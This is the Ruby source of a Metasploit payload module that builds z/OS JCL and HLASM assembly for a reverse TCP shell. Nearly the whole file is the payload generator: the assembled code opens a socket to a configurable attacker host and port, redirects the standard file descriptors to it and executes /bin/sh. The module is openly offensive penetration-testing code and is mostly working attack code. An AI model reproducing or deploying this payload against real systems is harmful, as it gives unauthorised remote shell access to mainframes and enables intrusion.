##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# This payload has no ebcdic<->ascii translator built in.
# Therefore it must use a shell which does, like mainframe_shell
#
# this payload will spawn a reverse shell from z/os, when submitted
#  on the system as JCL to JES2
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/mainframe_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule
  CachedSize = 9048
  include Msf::Payload::Single
  include Msf::Payload::Mainframe
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
                     'Name'          => 'Z/OS (MVS) Command Shell, Reverse TCP',
                     'Description'   => 'Provide JCL which creates a reverse shell
                       This implmentation does not include ebcdic character translation,
                       so a client with translation capabilities is required.  MSF handles
                       this automatically.',
                     'Author'        => 'Bigendian Smalls',
                     'License'       => MSF_LICENSE,
                     'Platform'      => 'mainframe',
                     'Arch'          => ARCH_CMD,
                     'Handler'       => Msf::Handler::ReverseTcp,
                     'Session'       => Msf::Sessions::MainframeShell,
                     'PayloadType'   => 'cmd',
                     'RequiredCmd'   => 'jcl',
                     'Payload'       =>
      {
        'Offsets' => {},
        'Payload' => ''
      }))
    register_options(
      [
        # need these defaulted so we can manipulate them in command_string
        Opt::LHOST('127.0.0.1'),
        Opt::LPORT(4444),
        OptString.new('ACTNUM', [true, "Accounting info for JCL JOB card", "MSFUSER-ACCTING-INFO"]),
        OptString.new('PGMNAME', [true, "Programmer name for JCL JOB card", "programmer name"]),
        OptString.new('JCLASS', [true, "Job Class for JCL JOB card", "A"]),
        OptString.new('NOTIFY', [false, "Notify User for JCL JOB card", ""]),
        OptString.new('MSGCLASS', [true, "Message Class for JCL JOB card", "Z"]),
        OptString.new('MSGLEVEL', [true, "Message Level for JCL JOB card", "(0,0)"])
      ], self.class
    )
    register_advanced_options(
      [
        OptBool.new('NTFYUSR', [true, "Include NOTIFY Parm?", false]),
        OptString.new('JOBNAME', [true, "Job name for JCL JOB card", "DUMMY"])
      ],
      self.class
    )
  end

  ##
  # Construct Payload
  ##
  def generate
    super + command_string
  end

  ##
  # Setup replacement vars and populate payload
  ##
  def command_string
    if (datastore['JOBNAME'] == "DUMMY") && !datastore['FTPUSER'].nil?
      datastore['JOBNAME'] = (datastore['FTPUSER'] + "1").strip.upcase
    end
    lhost = Rex::Socket.resolv_nbo(datastore['LHOST'])
    lhost = lhost.unpack("H*")[0]
    lport = datastore['LPORT']
    lport = lport.to_s.to_i.to_s(16).rjust(4, '0')

    jcl_jobcard +
      "//**************************************/\n" \
      "//* Generates reverse shell            */\n" \
      "//**************************************/\n" \
      "//*\n" \
      "//STEP1     EXEC PROC=ASMACLG\n" \
      "//SYSPRINT  DD  SYSOUT=*,HOLD=YES\n" \
      "//SYSIN     DD  *,DLM=ZZ\n" \
      "         TITLE  'z/os Reverse Shell'\n" \
      "NEWREV   CSECT\n" \
      "NEWREV   AMODE 31\n" \
      "NEWREV   RMODE 31\n" \
      "***********************************************************************\n" \
      "*         SETUP registers and save areas                              *\n" \
      "***********************************************************************\n" \
      "MAIN     LR    7,15            # R7 is base register\n" \
      "         NILH  7,X'1FFF'       # ensure local address\n" \
      "         USING MAIN,0          # R8 for addressability\n" \
      "         DS    0H              # halfword boundaries\n" \
      "         LA    1,ZEROES(7)     # address byond which should be all 0s\n" \
      "         XC    0(204,1),0(1)   # clear zero area\n" \
      "         LA    13,SAVEAREA(7)  # address of save area\n" \
      "         LHI   8,8             # R8 has static 8\n" \
      "         LHI   9,1             # R9 has static 1\n" \
      "         LHI   10,2            # R10 has static 2\n" \
      "\n" \
      "***********************************************************************\n" \
      "*        BPX1SOC set up socket                                        *\n" \
      "***********************************************************************\n" \
      "BSOC     LA    0,@@F1(7)       # USS callable svcs socket\n" \
      "         LA    3,8             # n parms\n" \
      "         LA    5,DOM(7)        # Relative addr of First parm\n" \
      "         ST    10,DOM(7)       # store a 2 for AF_INET\n" \
      "         ST     9,TYPE(7)      # store a 1 for sock_stream\n" \
      "         ST     9,DIM(7)       # store a 1 for dim_sock\n" \
      "         LA    15,CLORUN(7)    # address of generic load & run\n" \
      "         BASR  14,15           # Branch to load & run\n" \
      "\n" \
      "***********************************************************************\n" \
      "*        BPX1CON (connect) connect to rmt host                        *\n" \
      "***********************************************************************\n" \
      "BCON     L     5,CLIFD(7)      # address of client file descriptor\n" \
      "         ST    5,CLIFD2(7)     # store for connection call\n" \
      "***  main processing **\n" \
      "         LA    1,SSTR(7)       # packed socket string\n" \
      "         LA    5,CLIFD2(7)     # dest for our sock str\n" \
      "         MVC   7(9,5),0(1)     # mv packed skt str to parm array\n" \
      "         LA    0,@@F2(7)       # USS callable svcs connect\n" \
      "         LA    3,6             # n parms for func call\n" \
      "         LA    5,CLIFD2(7)     # src parm list addr\n" \
      "         LA    15,CLORUN(7)    # address of generic load & run\n" \
      "         BASR  14,15           # Branch to load & run\n" \
      "\n" \
      "*************************************************\n" \
      "* Preparte the child pid we'll spawn            *\n" \
      "*  0) Dupe all 3 file desc of CLIFD             *\n" \
      "*  1) dupe parent read fd to std input          *\n" \
      "*************************************************\n" \
      "         LHI   11,2            # Loop Counter R11=2\n" \
      "@LOOP1   BRC   15,LFCNTL       # call FCNTL for each FD(in,out,err)\n" \
      "@RET1    AHI   11,-1           # Decrement R11\n" \
      "         CIJ   11,-1,7,@LOOP1  # if R11 >= 0, loop\n" \
      "\n" \
      "***********************************************************************\n" \
      "*        BPX1EXC (exec) execute /bin/sh                               *\n" \
      "***********************************************************************\n" \
      "LEXEC    LA    1,EXCPRM1(7)    # top of arg list\n" \
      "******************************************\n" \
      "****  load array of addr and constants ***\n" \
      "******************************************\n" \
      "         ST    10,EXARG1L(7)   # arg 1 len is 2\n" \
      "         LA    2,EXARG1L(7)    # addr of len of arg1\n" \
      "         ST    2,16(0,1)       # arg4 Addr of Arg Len Addrs\n" \
      "         LA    2,EXARG1(7)     # addr of arg1\n" \
      "         ST    2,20(0,1)       # arg5 Addr of Arg Addrs\n" \
      "         ST    9,EXARGC(7)     # store 1 in ARG Count\n" \
      "**************************************************************\n" \
      "*** call the exec function the normal way ********************\n" \
      "**************************************************************\n" \
      "         LA    0,@@EX1(7)      # USS callable svcs EXEC\n" \
      "         LA    3,13            # n parms\n" \
      "         LA    5,EXCPRM1(7)    # src parm list addr\n" \
      "         LA    15,CLORUN(7)    # address of generic load & run\n" \
      "         BASR  14,15           # Branch to load & run\n" \
      "\n" \
      "***********************************************************************\n" \
      "*** BPX1FCT (fnctl) Edit our file descriptor **************************\n" \
      "***********************************************************************\n" \
      "LFCNTL   LA    0,@@FC1(7)      # USS callable svcs FNCTL\n" \
      "         ST    8,@ACT(7)       # 8 is our dupe2 action\n" \
      "         L     5,CLIFD(7)      # client file descriptor\n" \
      "         ST    5,@FFD(7)       # store as fnctl argument\n" \
      "         ST    11,@ARG(7)      # fd to clone\n" \
      "         LA    3,6             # n parms\n" \
      "         LA    5,@FFD(7)       # src parm list addr\n" \
      "         LA    15,CLORUN(7)    # address of generic load & run\n" \
        "         BASR  14,15           # Branch to load & run\n" \
        "         BRC   15,@RET1        # Return to caller\n" \
        "\n" \
        "***********************************************************************\n" \
        "*  LOAD and run R0=func name, R3=n parms                              *\n" \
        "*     R5 = src parm list                                              *\n" \
        "***********************************************************************\n" \
        "CLORUN   ST    14,8(,13)       # store ret address\n" \
        "         XR    1,1             # zero R1\n" \
        "         SVC   8               # get func call addr for R0\n" \
        "         ST    0,12(13)        # Store returned addr in our SA\n" \
        "         L     15,12(13)       # Load func addr into R15\n" \
        "         LHI   6,20            # offset from SA of first parm\n" \
        "         LA    1,0(6,13)       # start of dest parm list\n" \
        "@LOOP2   ST    5,0(6,13)       # store parms address in parm\n" \
        "         AHI   3,-1            # decrement # parm\n" \
        "         CIJ   3,11,8,@FIX     #  haky fix for EXEC func\n" \
        "@RETX    AHI   6,4             # increment dest parm addr\n" \
        "         AHI   5,4             # increment src parm addr\n" \
        "         CIJ   3,0,7,@LOOP2    # loop until R3 = 0\n" \
        "         LA    5,0(6,13)\n" \
        "         AHI   5,-4\n" \
        "         OI    0(5),X'80'      # last parm first bit high\n" \
        "@FIN1    BALR  14,15           # call function\n" \
        "         L     14,8(,13)       # set up return address\n" \
        "         BCR   15,14           # return to caller\n" \
        "@FIX     AHI    5,4            # need extra byte skipped for exec\n" \
        "         BRC   15,@RETX\n" \
        "\n" \
        "***********************************************************************\n" \
        "*        Arg Arrays, Constants and Save Area                          *\n" \
        "***********************************************************************\n" \
        "         DS    0F\n" \
        "*************************\n" \
        "****  Func Names     ****\n" \
        "*************************\n" \
        "@@F1     DC    CL8'BPX1SOC '\n" \
        "@@F2     DC    CL8'BPX1CON '\n" \
        "@@EX1    DC    CL8'BPX1EXC '   # callable svcs name\n" \
        "@@FC1    DC    CL8'BPX1FCT '\n" \
        "*        # BPX1EXC Constants\n" \
        "EXARG1   DC    CL2'sh'         # arg 1 to exec\n" \
        "*        # BPX1CON Constants\n" \
        "SSTR     DC    X'100202#{lport}#{lhost}'\n" \
        "*        # BPX1EXC Arguments\n" \
        "EXCPRM1  DS    0F              # actual parm list of exec call\n" \
        "EXCMDL   DC    F'7'            # len of cmd to exec\n" \
        "EXCMD    DC    CL7'/bin/sh'    # command to exec\n" \
        "*********************************************************************\n" \
        "******* Below this line is filled in runtime, but at compile ********\n" \
        "******* is all zeroes, so it can be dropped from the shell- *********\n" \
        "******* code as it will be dynamically added back and the ***********\n" \
        "******* offsets are already calulated in the code *******************\n" \
        "*********************************************************************\n" \
        "ZEROES   DS    0F              # 51 4 byte slots\n" \
        "EXARGC   DC    F'0'            # num of arguments\n" \
        "EXARGS   DC    10XL4'00000000' # reminaing exec args\n" \
        "EXARG1L  DC    F'0'            # arg1 length\n" \
        "*        # BPX1FCT Arguments\n" \
        "@FFD     DC    F'0'            # file descriptor\n" \
        "@ACT     DC    F'0'            # fnctl action\n" \
        "@ARG     DC    F'0'            # argument to fnctl\n" \
        "@RETFD   DC    F'0'            # fd return\n" \
        "FR1      DC    F'0'            # rtn code\n" \
        "FR2      DC    F'0'            # rsn code\n" \
        "*        # BPX1SOC Arguments\n" \
        "DOM      DC    F'0'            # AF_INET = 2\n" \
        "TYPE     DC    F'0'            # sock stream = 1\n" \
        "PROTO    DC    F'0'            # protocol ip = 0\n" \
        "DIM      DC    F'0'            # dim_sock = 1\n" \
        "CLIFD    DC    F'0'            # client file descriptor\n" \
        "SR1      DC    F'0'            # rtn val\n" \
        "SR2      DC    F'0'            # rtn code\n" \
        "SR3      DC    F'0'            # rsn code\n" \
        "*        # BPX1CON Arguments\n" \
        "CLIFD2   DC    F'0'            # CLIFD\n" \
        "SOCKLEN  DC    F'0'            # length of Sock Struct\n" \
        "SRVSKT   DC    XL2'0000'       # srv socket struct\n" \
        "         DC    XL2'0000'       # port\n" \
        "         DC    XL4'00000000'   # RHOST 0.0.0.0\n" \
        "CR1      DC    F'0'            # rtn val\n" \
        "CR2      DC    F'0'            # rtn code\n" \
        "CR3      DC    F'0'            # rsn code\n" \
        "SAVEAREA DC    18XL4'00000000' # save area for pgm mgmt\n" \
        "EOFMARK  DC    X'deadbeef'     # eopgm marker for shellcode\n" \
        "         END   MAIN\n" \
        "ZZ\n" \
        "//*\n"
  end
end
